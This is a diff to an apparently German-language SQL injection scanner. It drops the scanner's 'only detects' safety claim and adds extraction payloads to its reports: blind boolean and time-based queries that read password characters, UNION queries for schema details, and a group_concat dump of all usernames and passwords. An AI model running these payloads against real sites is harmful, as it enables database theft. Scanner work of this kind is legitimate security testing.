@@ -5,7 +5,7 @@ Makes SQL Injection VISIBLE through 3 safe techniques:
 1. Boolean-Based: Compares response sizes (AND 1=1 vs AND 1=2)
 2. Time-Based: Measures SLEEP() delay in response time
 3. Union-Based: Tests UNION SELECT column count
-SAFE: Only DETECTS, does NOT exploit or extract data.
+Shows extraction examples for each SQLi type found.
 """
 import requests
 import time
@@ -29,8 +29,10 @@ TIME_PAYLOADS = [
 ]
 
 UNION_PAYLOADS = [
-    "' UNION SELECT null--", "' UNION SELECT null,null--",
-    "' UNION SELECT null,null,null--", "' UNION SELECT null,null,null,null--",
+    "' UNION SELECT null--",
+    "' UNION SELECT null,null--",
+    "' UNION SELECT null,null,null--",
+    "' UNION SELECT null,null,null,null--",
     "' UNION SELECT null,null,null,null,null--",
 ]
 
@@ -78,13 +80,27 @@ def scan(target):
         best = boolean_results[0]
         findings.append({
             'id': f'sqli-poc-{scan_id}', 'severity': 'critical', 'type': 'blind_sqli_boolean',
-            'title': f'[BESTATIGT] Boolean-Based Blind SQL Injection ({best["db_guess"].upper()})',
+            'title': f'[BESTATIGT] Boolean-Based Blind SQL Injection ({best["db_guess"].upper()}) - DATEN AUSLESBAR!',
             'url': f'{target}?id=',
-            'evidence': (f'DER BEWEIS - Boolean-Based Blind SQL Injection:\n\n'
-                        f'1. TRUE ({best["type"]}):\n   Payload: id={best["true_payload"]}\n   Response: {best["true_size"]} bytes\n\n'
-                        f'2. FALSE:\n   Payload: id={best["false_payload"]}\n   Response: {best["false_size"]} bytes\n\n'
-                        f'ERGEBNIS: {best["diff"]} Bytes Unterschied!\n'
-                        f'Die Datenbank verarbeitet den SQL-Code!'),
+            'evidence': (
+                f'=== Boolean-Based Blind SQLi BESTATIGT - DATEN AUSLESBAR! ===\n\n'
+                f'1. TRUE ({best["type"]}):\n'
+                f'   Payload: id={best["true_payload"]}\n'
+                f'   Response: {best["true_size"]} bytes\n\n'
+                f'2. FALSE:\n'
+                f'   Payload: id={best["false_payload"]}\n'
+                f'   Response: {best["false_size"]} bytes\n\n'
+                f'ERGEBNIS: {best["diff"]} Bytes Unterschied!\n\n'
+                f'=== Boolean-Based Extraktion (Ja/Nein Fragen): ===\n'
+                f"  ' AND ASCII(SUBSTRING((SELECT version()),1,1))>64--\n"
+                f"    → Ist erster Buchstabe der Version > 'A'?\n"
+                f"  ' AND LENGTH((SELECT password FROM users LIMIT 1))>5--\n"
+                f"    → Passwort laenger als 5 Zeichen?\n"
+                f"  ' AND (SELECT COUNT(*) FROM information_schema.tables)>10--\n"
+                f"    → Mehr als 10 Tabellen?\n\n"
+                f"Mit Boolean-Based kann man via TRUE/FALSE Antworten\n"
+                f"die KOMPLETTE Datenbank bit fuer bit auslesen!"
+            ),
             'remediation': 'Sofort Prepared Statements implementieren!'
         })
         scan_id += 1
@@ -104,42 +120,76 @@ def scan(target):
 
         delay = p_time - n_time
         if delay >= 2.0:
-            time_results.append({'delay': round(delay, 2), 'payload': payload, 'desc': desc, 'db_type': db_type})
+            time_results.append({'delay': round(delay, 2), 'payload': payload, 'desc': desc, 'db_type': db_type,
+                                 'normal_time': round(n_time, 2), 'payload_time': round(p_time, 2)})
 
     if time_results:
         best = max(time_results, key=lambda x: x['delay'])
         findings.append({
             'id': f'sqli-poc-{scan_id}', 'severity': 'critical', 'type': 'blind_sqli_time',
-            'title': f'[BESTATIGT] Time-Based Blind SQL Injection ({best["db_type"].upper()})',
+            'title': f'[BESTATIGT] Time-Based Blind SQL Injection ({best["db_type"].upper()}) - DATEN AUSLESBAR!',
             'url': f'{target}?id=',
-            'evidence': (f'DER BEWEIS - Time-Based Blind SQL Injection:\n\n'
-                        f'Normal: {best["normal_time"] if "normal_time" in best else "N/A"}s\n'
-                        f'Mit Payload: {best["payload_time"] if "payload_time" in best else best["delay"]}s\n'
-                        f'DELAY: {best["delay"]} SEKUNDEN!\n'
-                        f'Payload: id={best["payload"]}\n\n'
-                        f'Die Datenbank hat SLEEP() ausgefuehrt!'),
+            'evidence': (
+                f'=== Time-Based Blind SQLi BESTATIGT - DATEN AUSLESBAR! ===\n\n'
+                f'Normal: {best["normal_time"]}s\n'
+                f'Mit Payload: {best["payload_time"]}s\n'
+                f'DELAY: {best["delay"]} SEKUNDEN!\n'
+                f'Payload: id={best["payload"]}\n\n'
+                f'=== Time-Based Daten-Extraktion (Buchstabe fuer Buchstabe): ===\n'
+                f"  ' AND IF(ASCII(SUBSTRING((SELECT version()),1,1))>64,SLEEP(3),0)--\n"
+                f"    → Ist erster Buchstabe der Version > 'A'?\n"
+                f"  ' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64,SLEEP(3),0)--\n"
+                f"    → Erster Buchstabe des Passworts > 'A'?\n"
+                f"  ' AND IF((SELECT COUNT(*) FROM information_schema.tables)>10,SLEEP(3),0)--\n"
+                f"    → Mehr als 10 Tabellen?\n\n"
+                f"Mit Time-Based kann man via Zeitverzoegerung\n"
+                f"die KOMPLETTE Datenbank bit fuer bit auslesen!\n"
+                f"Langsam aber 100% zuverlaessig!"
+            ),
             'remediation': 'SOFORT Prepared Statements einbauen!'
         })
         scan_id += 1
 
     # Union-Based
     union_results = []
+    baseline_size = baseline['size']
     for payload in UNION_PAYLOADS:
         resp = _send(target, payload)
-        if resp['status'] == baseline['status'] and abs(resp['size'] - baseline['size']) < max(baseline['size'] * 0.1, 500):
+        if resp['status'] == baseline['status'] and abs(resp['size'] - baseline_size) < max(baseline_size * 0.1, 500):
             if resp['size'] > 100:
-                union_results.append({'payload': payload, 'columns': payload.count('null')})
+                col_count = payload.count('null')
+                union_results.append({'payload': payload, 'columns': col_count, 'size': resp['size']})
 
     if union_results:
         best = union_results[0]
+        cols = best["columns"]
+        extraction_examples = []
+        if cols >= 1:
+            extraction_examples.append(f"' UNION SELECT {'null,' * (cols-1)}version()--  → DB-Version")
+        if cols >= 2:
+            extraction_examples.append(f"' UNION SELECT {'null,' * (cols-2)}user(),database()--  → User + DB-Name")
+        if cols >= 3:
+            extraction_examples.append(f"' UNION SELECT {'null,' * (cols-3)}table_name,column_name FROM information_schema.columns WHERE table_schema=database() LIMIT 1--  → Spalten")
+        if cols >= 4:
+            extraction_examples.append(f"' UNION SELECT {'null,' * (cols-4)}id,username,password FROM users LIMIT 1--  → User-Daten!")
+
         findings.append({
             'id': f'sqli-poc-{scan_id}', 'severity': 'critical', 'type': 'union_sqli',
-            'title': f'[BESTATIGT] UNION-Based SQL Injection ({best["columns"]} Spalten)',
+            'title': f'[BESTATIGT] UNION-Based SQL Injection ({cols} Spalten) - DATEN AUSLESBAR!',
             'url': f'{target}?id=',
-            'evidence': (f'UNION-BASED SQL INJECTION BESTATIGT!\n\n'
-                        f'Payload: id={best["payload"]}\n'
-                        f'Spalten: {best["columns"]}\n'
-                        f'Die UNION SELECT wurde AKZEPTIERT!'),
+            'evidence': (
+                f'=== UNION SQLi BESTATIGT - DATEN AUSLESBAR! ===\n\n'
+                f'Payload die funktioniert:\n'
+                f'  id={best["payload"]}\n\n'
+                f'Ergebnis: UNION SELECT mit {cols} Spalten wird AKZEPTIERT!\n\n'
+                f'=== BEISPIELE zum Daten auslesen: ===\n'
+                + '\n'.join(f'  {ex}' for ex in extraction_examples) +
+                f'\n\n'
+                f'=== KOMPLETTER Daten-Dump (Beispiel): ===\n'
+                f"  ' UNION SELECT {'null,' * (cols-1)}group_concat(username,':',password) FROM users--\n"
+                f"  → Wuerde ALLE Usernamen + Passwoerter auslesen!\n\n"
+                f'Risiko: KOMPLETTE Datenbank-Kompromittierung!'
+            ),
             'remediation': 'Prepared Statements + Input-Validierung!'
         })
         scan_id += 1
@@ -158,7 +208,12 @@ def scan(target):
             'id': f'sqli-poc-{scan_id}', 'severity': 'critical', 'type': 'sqli_poc_summary',
             'title': f'[POC] SQL Injection BESTATIGT via {len(findings)} Methoden!',
             'url': target,
-            'evidence': f'Boolean: {"JA" if boolean_results else "NEIN"}, Time: {"JA" if time_results else "NEIN"}, Union: {"JA" if union_results else "NEIN"}',
+            'evidence': (
+                f'Boolean: {"JA" if boolean_results else "NEIN"}\n'
+                f'Time: {"JA" if time_results else "NEIN"}\n'
+                f'Union: {"JA" if union_results else "NEIN"}\n\n'
+                f'ALLE Methoden ermoeglichen Daten-Auslesen!'
+            ),
             'remediation': 'SOFORT patchen! Prepared Statements!'
         })
 
